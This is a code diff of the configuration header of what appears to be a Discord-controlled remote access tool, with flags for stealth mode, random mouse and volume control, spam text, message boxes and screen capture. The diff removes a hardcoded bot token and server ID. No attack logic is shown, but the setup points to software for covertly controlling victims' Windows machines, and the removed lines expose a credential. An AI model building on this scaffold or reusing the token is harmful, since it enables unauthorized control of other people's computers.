@@ -1,31 +1,29 @@
-# yes, the token has been reset, dumbasses 💀
 from modules.fem_imports import *
 
 #//  VARIABLES AND CONSTANTS (DO NOT TOUCH ANYTHING EXCEPT GUILD_ID AND TOKEN)  \\#
-version = "(version: 1.7)"														  #
-guild_id = "1154205349193203774"												  #
-token = "MTExNDIyNDk2NjI3NjIxOTA3MQ.GFdLfX.K45SLkkvZcRx8aapzxoGtkP9bPUgTTbH2N5x7Y"#
-login = os.getlogin()															  #
-client = discord.Client(intents=discord.Intents.all())							  #
-session_id = os.urandom(4).hex()												  #
-session_name = os.getlogin() + "-" + session_id									  #
-#guild_id = "1114226494693191742" # public server								  #
-get_cmds = False																  #
-random_mouse_running = False													  #
-random_volume_control = False													  #
-spamtext = False																  #
-stealth = False																	  #
-MB_OK = 0x00000000																  #
-MB_OKCANCEL = 0x00000001														  #
-MB_YESNO = 0x00000004															  #
-MB_ICONERROR = 0x00000010														  #
-MB_ICONINFORMATION = 0x00000040													  #
-MB_ICONWARNING = 0x00000030														  #
-MB_ICONQUESTION = 0x00000020													  #
-SRCCOPY = 0x00EE0086															  #
-user32 = ctypes.windll.user32													  #
-femboyaccess_dir = os.path.dirname(os.path.abspath(__file__))					  #
-new_femboyaccess_dir = "C:\Desktop"												  #
+version = "(version: 1.7)"
+guild_id = ""
+token = ""
+login = os.getlogin()
+client = discord.Client(intents=discord.Intents.all())
+session_id = os.urandom(4).hex()
+session_name = os.getlogin() + "-" + session_id
+get_cmds = False
+random_mouse_running = False
+random_volume_control = False
+spamtext = False
+stealth = False
+MB_OK = 0x00000000
+MB_OKCANCEL = 0x00000001
+MB_YESNO = 0x00000004
+MB_ICONERROR = 0x00000010
+MB_ICONINFORMATION = 0x00000040
+MB_ICONWARNING = 0x00000030
+MB_ICONQUESTION = 0x00000020
+SRCCOPY = 0x00EE0086
+user32 = ctypes.windll.user32
+femboyaccess_dir = os.path.dirname(os.path.abspath(__file__))
+new_femboyaccess_dir = "C:\Desktop"
 ###################################################################################
 
 commands_list = [
